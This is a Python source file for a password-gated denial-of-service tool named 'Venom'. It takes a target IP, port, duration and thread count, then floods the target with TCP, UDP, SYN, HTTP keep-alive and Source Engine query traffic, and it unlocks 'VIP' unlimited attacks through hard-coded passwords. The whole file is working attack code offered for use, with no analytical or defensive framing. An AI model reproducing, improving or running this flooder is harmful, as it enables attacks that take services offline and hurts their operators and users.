import os
import time
import threading
import socket
import random
import requests
import datetime
from colorama import Fore, init
from sys import stdout
            
#try:
	#requests.get('https://www.google.com')
#except:
	#print('No Connection')
	#time.sleep(1000)
	#os.system(exit)
	
running = 0
salah = 0
vip = False

banner = """[Venom]Type 'help' For More Help"""
banner1 = """[Venom Methods]\n layer4"""
banner2 = """[Command List]\n methods [Using For DDoS]\n stats [showing running attacks]"""
banner5 = """[Methods List]\n tcp\n vse \n udp \n venomtcp \n http \n syn"""
layers4 = """[Tuts] (Methods) (ip) (time)"""
layers7 = """idk cuy"""

def loading():
	os.system('clear')
	print('[=           ]')
	time.sleep(0.3)
	os.system('clear')
	print('[==          ]')
	time.sleep(0.3)
	os.system('clear')
	print('[===         ]')
	time.sleep(0.3)
	os.system('clear')
	print('[====        ]')
	time.sleep(0.3)
	os.system('clear')
	print('[=====       ]')
	time.sleep(0.3)
	os.system('clear')
	print('[======      ]')
	time.sleep(0.3)
	os.system('clear')
	print('[=======     ]')
	time.sleep(0.3)
	os.system('clear')
	print('[========    ]')
	time.sleep(0.3)
	os.system('clear')
	print('[==========  ]')
	time.sleep(0.3)
	os.system('clear')
	print('[=========== ]')
	time.sleep(0.3)
	os.system('clear')
	print('[============]')
	time.sleep(0.3)
	os.system('clear')
	
def maxthread():
	global thread
	global vip
	if vip == True:
		thread = int(input('[VenomVip@Root]Thread:'))
	else:
		thread = int(input('[Venom@Root]Thread:'))
		if thread > 10:
			print('[Venom]Max 10 Thread Try Again')
			maxthread()
		if thread < 0:
			print('[Venom]Dont Be Stupid Try Again')
			maxthread()
	
def maxtime():
	global timer
	global vip
	if vip == True:
		timer = int(input('[VenomVip@Root]Time:'))
	else:
		timer = int(input('[Venom@Root]Time:'))
		if timer > 60:
			print('[Venom]Max Times 60')
			maxtime()
		if timer < 0:
			print('[Venom]Dont Be Stupid Try Again')
			maxtime()

def ron():
	global running
	global timer
	time.sleep(timer)
	running -= 1
	
def UAlist():
	return [
	"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US ByteFullLocale/en isDarkMode/0 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
	"Podcasts/1650.20 CFNetwork/1333.0.4 Darwin/21.5.0",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US RevealType/Dialog isDarkMode/0 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US ByteFullLocale/en isDarkMode/1 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/103.0.5060.63 Mobile/15E148 Safari/604.1",
	"AppleCoreMedia/1.0.0.19F77 (iPhone; U; CPU OS 15_5 like Mac OS X; nl_nl)",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US RevealType/Dialog isDarkMode/1 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/"
	]

def http():
	global running
	threading.Thread(target=ron).start()
	running += 1
	timeout = time.time() + float(timer)
	while time.time() < timeout:
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
			try:
				sock.connect((ip, port))
				while time.time() < timeout:
					sock.send(f'GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {random.choice(UAlist())}\r\nConnection: keep-alive\r\n\r\n'.encode())
			except:
				sock.close()
				
def tcp():
	global running
	#loading()
	threading.Thread(target=ron).start()
	running += 1
	timeout = time.time() + float(timer)
	while time.time() < timeout:
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
			try:
				sock.connect((ip, port))
				while time.time() < timeout:
					sock.send(random._urandom(1024))
			except:
				pass
				
def syn():
	global running
	threading.Thread(target=ron).start()
	running += 1
	timeout = time.time() + float(timer)
	while time.time() < timeout:
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
			sock.setblocking(0)
		try:
			sock.connect((ip, port))
		except:
			pass

def udp():
	global running
	threading.Thread(target=ron).start()
	running += 1
	timeout = time.time() + float(timer)
	while time.time() < timeout:
		with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
			data = random._urandom(1024)
			sock.sendto(data, (ip, port))
			
def vse():
	global running
	payload = b'\xff\xff\xff\xffTSource Awang Cuyyy\x00'
	threading.Thread(target=ron).start()
	running += 1
	timeout = time.time() + float(timer)
	while time.time() < timeout:
		with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
			sock.sendto(payload, (ip, port))

def venomtcp():
	global running
	#loading()
	threading.Thread(target=ron).start()
	running += 1
	timeout = time.time() + float(timer)
	while time.time() < timeout:
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
			sock.setblocking(0)
			try:
				sock.connect((ip, port))
				while time.time() < timeout:
					sock.send(random._urandom(1024).encode())
			except:
				pass
			
def lol():
	global vip
	global ip
	global port
	global thread
	global timer
	global running
	cnc = input('[Venom@Root]:')
	if cnc == 'help':
		os.system('clear')
		print(banner2)
		lol()
	elif cnc == 'methods':
		os.system('clear')
		print(banner1)
		lol()
	elif cnc == 'layer4':
		os.system('clear')
		print(banner5)
		lol()
	elif cnc == 'stats':
		print(f' Running Attacks Count:{running}')
		lol()
	elif cnc == 'tcp':
		os.system('clear')
		ip = str(input('[Venom@Root]Ip Target:'))
		port = int(input('[Venom@Root]Port:'))
		maxtime()
		maxthread()
		os.system('clear')
		print(f'[Attack Sent]\n Ip Target:{ip}\n Port:{port}\n Time:{timer}\n Thread:{thread}\n Methods:tcp')
		for i in range(0, thread):
			threading.Thread(target=tcp).start()
		lol()
	elif cnc == 'syn':
		os.system('clear')
		ip = str(input('[Venom@Root]Ip Target:'))
		port = int(input('[Venom@Root]Port:'))
		maxtime()
		maxthread()
		os.system('clear')
		print(f'[Attack Sent]\n Ip Target:{ip}\n Port:{port}\n Time:{timer}\n Thread:{thread}\n Methods:syn')
		for i in range(0, thread):
			threading.Thread(target=syn).start()
		lol()
	elif cnc == 'udp':
		os.system('clear')
		ip = str(input('[Venom@Root]Ip Target:'))
		port = int(input('[Venom@Root]Port:'))
		maxtime()
		maxthread()
		os.system('clear')
		print(f'[Attack Sent]\n Ip Target:{ip}\n Port:{port}\n Time:{timer}\n Thread:{thread}\n Methods:udp')
		for i in range(0, thread):
			threading.Thread(target=udp).start()
		lol()
	elif cnc == 'http':
		os.system('clear')
		ip = str(input('[Venom@Root]Ip Target:'))
		port = int(input('[Venom@Root]Port:'))
		maxtime()
		maxthread()
		os.system('clear')
		print(f'[Attack Sent]\n Ip Target:{ip}\n Port:{port}\n Time:{timer}\n Thread:{thread}\n Methods:http')
		for i in range(0, thread):
			threading.Thread(target=http).start()
		lol()
	elif cnc == 'venomtcp':
		os.system('clear')
		ip = str(input('[Venom@Root]Ip Target:'))
		port = int(input('[Venom@Root]Port:'))
		maxtime()
		maxthread()
		os.system('clear')
		print(f'[Attack Sent]\n Ip Target:{ip}\n Port:{port}\n Time:{timer}\n Thread:{thread}\n Methods:venomtcp')
		for i in range(0, thread):
			threading.Thread(target=venomtcp).start()
		lol()
	elif cnc == 'vse':
		os.system('clear')
		ip = str(input('[Venom@Root]Ip Target:'))
		port = int(input('[Venom@Root]Port:'))
		maxtime()
		maxthread()
		os.system('clear')
		print(f'[Attack Sent]\n Ip Target:{ip}\n Port:{port}\n Time:{timer}\n Thread:{thread}\n Methods:vse')
		for i in range(0, thread):
			threading.Thread(target=vse).start()
		lol()
	else:
		print('[Venom]Command Not Found')
		lol()
	
passlist = ['Venom','venom','VENOM']
viplist = ['VipCuy', 'vipcuy', 'VIPCUY', 'Vipcuy']

def main():
	global salah
	global vip
	#loading()
	#print('[Vip Features]\n No Limit')
	print('Credit : Code By Awang')
	print('[info]To Unlock Vip You Need To Know Vip Password')
	password = input('[Venom]Password:')
	if password in passlist:
		print('[Venom]Correct Password')
		time.sleep(3)
		os.system('clear')
		print(banner)
		lol()
	elif password in viplist:
		print('[Venom]Correct Vip Password')
		vip = True
		time.sleep(3)
		os.system('clear')
		print(banner)
		lol()
	elif salah == 3:
		print('[Exit]To Many Wrong Password')
		time.sleep(999)
		os.system(exit)
	else:
		print('[Venom]Wrong Password')
		salah += 1
		main()
	

main()